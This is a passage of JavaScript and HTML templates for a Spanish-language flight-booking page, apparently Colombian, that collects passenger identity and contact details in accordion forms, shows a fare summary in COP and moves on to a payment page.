                                <input required class="input-date-bg" value=" " oninput="formatDate(this)" name="bithdate" type="text" required>
                                <label for="origin">Fecha de Nacimiento</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Masculino">Masculino</option>
                                    <option value="Femenino">Femenino</option>
                                </select>
                                <label for="origin">Género</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Afganistán">Afganistán</option>
                                    <option value="Albania">Albania</option>
                                    <option value="Alemania">Alemania</option>
                                    <option value="Andorra">Andorra</option>
                                    <option value="Angola">Angola</option>
                                    <option value="Antigua y Barbuda">Antigua y Barbuda</option>
                                    <option value="Arabia Saudita">Arabia Saudita</option>
                                    <option value="Argelia">Argelia</option>
                                    <option value="Argentina">Argentina</option>
                                    <option value="Armenia">Armenia</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Austria">Austria</option>
                                    <option value="Azerbaiyán">Azerbaiyán</option>
                                    <option value="Bahamas">Bahamas</option>
                                    <option value="Bangladés">Bangladés</option>
                                    <option value="Barbados">Barbados</option>
                                    <option value="Baréin">Baréin</option>
                                    <option value="Bélgica">Bélgica</option>
                                    <option value="Belice">Belice</option>
                                    <option value="Benín">Benín</option>
                                    <option value="Bielorrusia">Bielorrusia</option>
                                    <option value="Birmania/Myanmar">Birmania/Myanmar</option>
                                    <option value="Bolivia">Bolivia</option>
                                    <option value="Bosnia y Herzegovina">Bosnia y Herzegovina</option>
                                    <option value="Botsuana">Botsuana</option>
                                    <option value="Brasil">Brasil</option>
                                    <option value="Brunéi">Brunéi</option>
                                    <option value="Bulgaria">Bulgaria</option>
                                    <option value="Burkina Faso">Burkina Faso</option>
                                    <option value="Burundi">Burundi</option>
                                    <option value="Bután">Bután</option>
                                    <option value="Cabo Verde">Cabo Verde</option>
                                    <option value="Camboya">Camboya</option>
                                    <option value="Camerún">Camerún</option>
                                    <option value="Canadá">Canadá</option>
                                    <option value="Catar">Catar</option>
                                    <option value="Chad">Chad</option>
                                    <option value="Chile">Chile</option>
                                    <option value="China">China</option>
                                    <option value="Chipre">Chipre</option>
                                    <option value="Ciudad del Vaticano">Ciudad del Vaticano</option>
                                    <option value="Colombia" selected>Colombia</option>
                                    <option value="Comoras">Comoras</option>
                                    <option value="Corea del Norte">Corea del Norte</option>
                                    <option value="Corea del Sur">Corea del Sur</option>
                                    <option value="Costa de Marfil">Costa de Marfil</option>
                                    <option value="Costa Rica">Costa Rica</option>
                                    <option value="Croacia">Croacia</option>
                                    <option value="Cuba">Cuba</option>
                                    <option value="Dinamarca">Dinamarca</option>
                                    <option value="Dominica">Dominica</option>
                                    <option value="Ecuador">Ecuador</option>
                                    <option value="Egipto">Egipto</option>
                                    <option value="El Salvador">El Salvador</option>
                                    <option value="Emiratos Árabes Unidos">Emiratos Árabes Unidos</option>
                                    <option value="Eritrea">Eritrea</option>
                                    <option value="Eslovaquia">Eslovaquia</option>
                                    <option value="Eslovenia">Eslovenia</option>
                                    <option value="España">España</option>
                                    <option value="Estados Unidos">Estados Unidos</option>
                                    <option value="Estonia">Estonia</option>
                                    <option value="Etiopía">Etiopía</option>
                                    <option value="Filipinas">Filipinas</option>
                                    <option value="Finlandia">Finlandia</option>
                                    <option value="Fiyi">Fiyi</option>
                                    <option value="Francia">Francia</option>
                                    <option value="Gabón">Gabón</option>
                                    <option value="Gambia">Gambia</option>
                                    <option value="Georgia">Georgia</option>
                                    <option value="Ghana">Ghana</option>
                                    <option value="Granada">Granada</option>
                                    <option value="Grecia">Grecia</option>
                                    <option value="Guatemala">Guatemala</option>
                                    <option value="Guyana">Guyana</option>
                                    <option value="Guinea">Guinea</option>
                                    <option value="Guinea ecuatorial">Guinea ecuatorial</option>
                                    <option value="Guinea-Bisáu">Guinea-Bisáu</option>
                                    <option value="Haití">Haití</option>
                                    <option value="Honduras">Honduras</option>
                                    <option value="Hungría">Hungría</option>
                                    <option value="India">India</option>
                                    <option value="Indonesia">Indonesia</option>
                                    <option value="Irak">Irak</option>
                                    <option value="Irán">Irán</option>
                                    <option value="Irlanda">Irlanda</option>
                                    <option value="Islandia">Islandia</option>
                                    <option value="Islas Marshall">Islas Marshall</option>
                                    <option value="Islas Salomón">Islas Salomón</option>
                                    <option value="Israel">Israel</option>
                                    <option value="Italia">Italia</option>
                                    <option value="Jamaica">Jamaica</option>
                                    <option value="Japón">Japón</option>
                                    <option value="Jordania">Jordania</option>
                                    <option value="Kazajistán">Kazajistán</option>
                                    <option value="Kenia">Kenia</option>
                                    <option value="Kirguistán">Kirguistán</option>
                                    <option value="Kiribati">Kiribati</option>
                                    <option value="Kuwait">Kuwait</option>
                                    <option value="Laos">Laos</option>
                                    <option value="Lesoto">Lesoto</option>
                                    <option value="Letonia">Letonia</option>
                                    <option value="Líbano">Líbano</option>
                                    <option value="Liberia">Liberia</option>
                                    <option value="Libia">Libia</option>
                                    <option value="Liechtenstein">Liechtenstein</option>
                                    <option value="Lituania">Lituania</option>
                                    <option value="Luxemburgo">Luxemburgo</option>
                                    <option value="Macedonia del Norte">Macedonia del Norte</option>
                                    <option value="Madagascar">Madagascar</option>
                                    <option value="Malasia">Malasia</option>
                                    <option value="Malaui">Malaui</option>
                                    <option value="Maldivas">Maldivas</option>
                                    <option value="Malí">Malí</option>
                                    <option value="Malta">Malta</option>
                                    <option value="Marruecos">Marruecos</option>
                                    <option value="Mauricio">Mauricio</option>
                                    <option value="Mauritania">Mauritania</option>
                                    <option value="México">México</option>
                                    <option value="Micronesia">Micronesia</option>
                                    <option value="Moldavia">Moldavia</option>
                                    <option value="Mónaco">Mónaco</option>
                                    <option value="Mongolia">Mongolia</option>
                                    <option value="Montenegro">Montenegro</option>
                                    <option value="Mozambique">Mozambique</option>
                                    <option value="Namibia">Namibia</option>
                                    <option value="Nauru">Nauru</option>
                                    <option value="Nepal">Nepal</option>
                                    <option value="Nicaragua">Nicaragua</option>
                                    <option value="Níger">Níger</option>
                                    <option value="Nigeria">Nigeria</option>
                                    <option value="Noruega">Noruega</option>
                                    <option value="Nueva Zelanda">Nueva Zelanda</option>
                                    <option value="Omán">Omán</option>
                                    <option value="Países Bajos">Países Bajos</option>
                                    <option value="Pakistán">Pakistán</option>
                                    <option value="Palaos">Palaos</option>
                                    <option value="Panamá">Panamá</option>
                                    <option value="Papúa Nueva Guinea">Papúa Nueva Guinea</option>
                                    <option value="Paraguay">Paraguay</option>
                                    <option value="Perú">Perú</option>
                                    <option value="Polonia">Polonia</option>
                                    <option value="Portugal">Portugal</option>
                                    <option value="Reino Unido">Reino Unido</option>
                                    <option value="República Centroafricana">República Centroafricana</option>
                                    <option value="República Checa">República Checa</option>
                                    <option value="República del Congo">República del Congo</option>
                                    <option value="República Democrática del Congo">República Democrática del Congo</option>
                                    <option value="República Dominicana">República Dominicana</option>
                                    <option value="República Sudafricana">República Sudafricana</option>
                                    <option value="Ruanda">Ruanda</option>
                                    <option value="Rumanía">Rumanía</option>
                                    <option value="Rusia">Rusia</option>
                                    <option value="Samoa">Samoa</option>
                                    <option value="San Cristóbal y Nieves">San Cristóbal y Nieves</option>
                                    <option value="San Marino">San Marino</option>
                                    <option value="San Vicente y las Granadinas">San Vicente y las Granadinas</option>
                                    <option value="Santa Lucía">Santa Lucía</option>
                                    <option value="Santo Tomé y Príncipe">Santo Tomé y Príncipe</option>
                                    <option value="Senegal">Senegal</option>
                                    <option value="Serbia">Serbia</option>
                                    <option value="Seychelles">Seychelles</option>
                                    <option value="Sierra Leona">Sierra Leona</option>
                                    <option value="Singapur">Singapur</option>
                                    <option value="Siria">Siria</option>
                                    <option value="Somalia">Somalia</option>
                                    <option value="Sri Lanka">Sri Lanka</option>
                                    <option value="Suazilandia">Suazilandia</option>
                                    <option value="Sudán">Sudán</option>
                                    <option value="Sudán del Sur">Sudán del Sur</option>
                                    <option value="Suecia">Suecia</option>
                                    <option value="Suiza">Suiza</option>
                                    <option value="Surinam">Surinam</option>
                                    <option value="Tailandia">Tailandia</option>
                                    <option value="Tanzania">Tanzania</option>
                                    <option value="Tayikistán">Tayikistán</option>
                                    <option value="Timor Oriental">Timor Oriental</option>
                                    <option value="Togo">Togo</option>
                                    <option value="Tonga">Tonga</option>
                                    <option value="Trinidad y Tobago">Trinidad y Tobago</option>
                                    <option value="Túnez">Túnez</option>
                                    <option value="Turkmenistán">Turkmenistán</option>
                                    <option value="Turquía">Turquía</option>
                                    <option value="Tuvalu">Tuvalu</option>
                                    <option value="Ucrania">Ucrania</option>
                                    <option value="Uganda">Uganda</option>
                                    <option value="Uruguay">Uruguay</option>
                                    <option value="Uzbekistán">Uzbekistán</option>
                                    <option value="Vanuatu">Vanuatu</option>
                                    <option value="Venezuela">Venezuela</option>
                                    <option value="Vietnam">Vietnam</option>
                                    <option value="Yemen">Yemen</option>
                                    <option value="Yibuti">Yibuti</option>
                                    <option value="Zambia">Zambia</option>
                                    <option value="Zimbabue">Zimbabue</option>
                                </select>
                                <label for="origin">Nacionalidad</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="cc">Cédula de Ciudadanía</option>
                                    <option value="passport">Pasaporte</option>
                                </select>
                                <label for="origin">Tipo de documento</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="number" name="cc" required oninput="limitDigits(this, 10)">
                                <label for="origin">Número de documento</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Sin puntos ni guión</p>
                            </div>
                            <div class="input-container ">
                                <input class="" type="text">
                                <label for="origin">N° de pasajero frecuente (Opcional)</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Agrega número de socio y acumula millas</p>
                            </div>
            
                            <p class="fs-4 tc-ocean-2 fw-light mt-5">Información de contacto</p>
            
                            <div class="input-container ">
                                <input required class="" type="email" required>
                                <label for="origin">Email</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="text" required>
                                <label for="origin">Número de teléfono</label>
                            </div>
            
                            <button class="btn-success-2 mt-4" type="submit">
                                Guardar
                            </button>
                        </form>
                    </div>
                `;
                i++;
            });
        }

        this.showDetails(0);


        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e)=>{
                e.preventDefault();
                this.setInformation(e.target);
            });
        });
        
    }

    static showDetails(id){
        const passenger = document.getElementById(id);
        const button = passenger.childNodes[1];
        const form = passenger.childNodes[3];

        button.classList.replace('btn-closed-accordion', 'btn-opened-accordion');
        button.setAttribute('onclick', `UIPassengers.closeDetails(${id})`);
        let ptype = '';
        switch(form.dataset.type){
            case 'adults': ptype = 'Adulto'; break;
            case 'children': ptype = 'Niño'; break;
            case 'babies': ptype = 'Bebé'; break;
        }
        if(form.dataset.info === 'set'){
            console.log('dejar');
        }else{
            button.innerHTML = `
                <div class="d-flex align-items-center">
                    <svg class="tc-ocean-2 mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none" focusable="false"><path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103ZM14.0075 13.1093C12.352 13.1093 10.9305 12.5169 9.75202 11.3324C8.57354 10.1478 7.98417 8.72835 7.98417 7.0549C7.98417 5.38145 8.57354 3.96157 9.75202 2.77699C10.9305 1.59242 12.352 1 14.0075 1C15.1205 1 16.1493 1.29183 17.0846 1.86531C18.0199 2.4388 18.7498 3.18116 19.2548 4.0931C19.7692 5.00503 20.0216 5.99254 20.0216 7.0549C20.0216 8.18307 19.7317 9.2074 19.1612 10.1475C18.5907 11.0877 17.8517 11.8211 16.9444 12.3381C16.0465 12.8458 15.0644 13.1093 14.0075 13.1093ZM4.68275 31C4.50504 31 4.34581 30.9344 4.20551 30.7934C4.06522 30.6524 4 30.4831 4 30.2669V20.5644C4 20.2635 4.14963 20.0379 4.44893 19.8781L24.062 12.7706C25.1843 12.3475 26.1196 12.3758 26.8679 12.8647C27.6255 13.3817 28 14.1812 28 15.2811V30.2104C28 30.3891 27.9343 30.5487 27.794 30.6897C27.6631 30.8307 27.4853 30.8967 27.2702 30.8967C27.0644 30.8967 26.8963 30.8307 26.7747 30.6897C26.6531 30.5487 26.5875 30.3985 26.5875 30.2104V15.2811C26.5875 14.7076 26.4287 14.2939 26.0919 14.0495C25.7272 13.805 25.2124 13.8237 24.5483 14.0963L5.38423 21.0629V30.2573C5.38423 30.4735 5.31856 30.6428 5.17826 30.7838C5.06603 30.9342 4.88852 31 4.68275 31Z" fill="currentColor"></path></svg>
                    <p class="m-0 fw-bolder tc-ocean">${ptype}</p>
                </div>
                <svg class="tc-pink" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
            `;
        }
        

        form.classList.add('d-flex');
    }

    static closeDetails(id){
        const passenger = document.getElementById(id);
        const button = passenger.childNodes[1];
        const form = passenger.childNodes[3];

        button.classList.replace('btn-opened-accordion', 'btn-closed-accordion');
        button.setAttribute('onclick', `UIPassengers.showDetails(${id})`);
        let ptype = '';
        switch(button.dataset.type){
            case 'adults': ptype = 'Adulto'; break;
            case 'children': ptype = 'Niño'; break;
            case 'babies': ptype = 'Bebé'; break;
        }
        if(form.dataset.info === 'set'){
            console.log('dejar');
        }else{
            button.innerHTML = `
                <div class="d-flex align-items-center">
                    <svg class="tc-ocean-2 mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none" focusable="false"><path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103ZM14.0075 13.1093C12.352 13.1093 10.9305 12.5169 9.75202 11.3324C8.57354 10.1478 7.98417 8.72835 7.98417 7.0549C7.98417 5.38145 8.57354 3.96157 9.75202 2.77699C10.9305 1.59242 12.352 1 14.0075 1C15.1205 1 16.1493 1.29183 17.0846 1.86531C18.0199 2.4388 18.7498 3.18116 19.2548 4.0931C19.7692 5.00503 20.0216 5.99254 20.0216 7.0549C20.0216 8.18307 19.7317 9.2074 19.1612 10.1475C18.5907 11.0877 17.8517 11.8211 16.9444 12.3381C16.0465 12.8458 15.0644 13.1093 14.0075 13.1093ZM4.68275 31C4.50504 31 4.34581 30.9344 4.20551 30.7934C4.06522 30.6524 4 30.4831 4 30.2669V20.5644C4 20.2635 4.14963 20.0379 4.44893 19.8781L24.062 12.7706C25.1843 12.3475 26.1196 12.3758 26.8679 12.8647C27.6255 13.3817 28 14.1812 28 15.2811V30.2104C28 30.3891 27.9343 30.5487 27.794 30.6897C27.6631 30.8307 27.4853 30.8967 27.2702 30.8967C27.0644 30.8967 26.8963 30.8307 26.7747 30.6897C26.6531 30.5487 26.5875 30.3985 26.5875 30.2104V15.2811C26.5875 14.7076 26.4287 14.2939 26.0919 14.0495C25.7272 13.805 25.2124 13.8237 24.5483 14.0963L5.38423 21.0629V30.2573C5.38423 30.4735 5.31856 30.6428 5.17826 30.7838C5.06603 30.9342 4.88852 31 4.68275 31Z" fill="currentColor"></path></svg>
                    <p class="m-0 fw-light tc-gray-smoke">${ptype}</p>
                </div>
                <svg class="tc-pink arrow-open" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
            `;
        }
        

        form.classList.remove('d-flex');
        window.scrollTo(0,0);
    }

    static setInformation(form){
        this.closeDetails(form.id);

        
        const passenger = document.getElementById(form.id);
        const button = passenger.childNodes[1];

        form.setAttribute('data-info', 'set');
        button.innerHTML = `
            <div class="d-flex align-items-center">
                <div class="profile-pic">
                    <span>${form['name'].value.split(' ')[0][0]}${form['surname'].value.split(' ')[0][0]}</span>
                </div>
                <div class="text-start">
                    <p class="fw-bolder tc-ocean-2 m-0">${form['name'].value.split(' ')[0]} ${form['surname'].value.split(' ')[0]}</p>
                    <p class="fw-light m-0 fs-5 tc-gray-smoke">- C. Identidad -</p>
                    <p class="fw-light m-0 fs-5 tc-gray-smoke">${form['cc'].value}</p>
                </div>
            </div>
            <div class="d-flex align-items-center">
                <svg class="tc-lima mr-2" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M10 0c5.5 0 10 4.5 10 10s-4.5 10-10 10S0 15.5 0 10 4.5 0 10 0zm3.825 6.055l-5.62 5.643L5.39 8.804l-1.361 1.43 4.175 4.272 7.032-7.098-1.412-1.353z"></path></svg>
                <svg class="tc-pink" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
            </div>
        `;

        try{
            let forms = document.querySelectorAll('form');
            let arrayForms = [...forms];

            if(arrayForms.filter(form => form.dataset.info === 'set').length !== forms.length){
                this.showDetails(parseInt(form.id) + 1);
            }else{
                const btnNextStep = document.querySelector('#btn-next-step');
                btnNextStep.classList.replace('btn-disabled', 'btn-success');
                btnNextStep.setAttribute('onclick', "nextStep()");
            }
        }catch(err){
            console.log(err);
        }
    }
}







/**
 * DOM STARTUP 
 */
document.addEventListener('DOMContentLoaded', ()=>{
    UIPassengers.showPassengers();
});








/**
 * MODAL SETUP
 */
let totalPassengers = info.flightInfo.adults + info.flightInfo.children;
if(info.flightInfo.travel_type === 1){
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
}else{
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
}
document.querySelector('#modal-passengers').textContent = totalPassengers + info.flightInfo.babies;
document.querySelector('#modal-travel').textContent = `${info.flightInfo.origin.code} → ${info.flightInfo.destination.code}`





/**
 * UTILS 
 */
const formatDate = input =>{
    let valor = input.value.replace(/\D/g, '');
    valor = valor.slice(0, 8);
    if (valor.length > 4) {
        valor = valor.replace(/^(\d{2})(\d{2})(\d+)/, '$1-$2-$3');
    } else if (valor.length > 2) {
        valor = valor.replace(/^(\d{2})(\d+)/, '$1-$2');
    }

    input.value = valor;
}

const nextStep = () =>{
    window.location.href = 'payment.php';
}
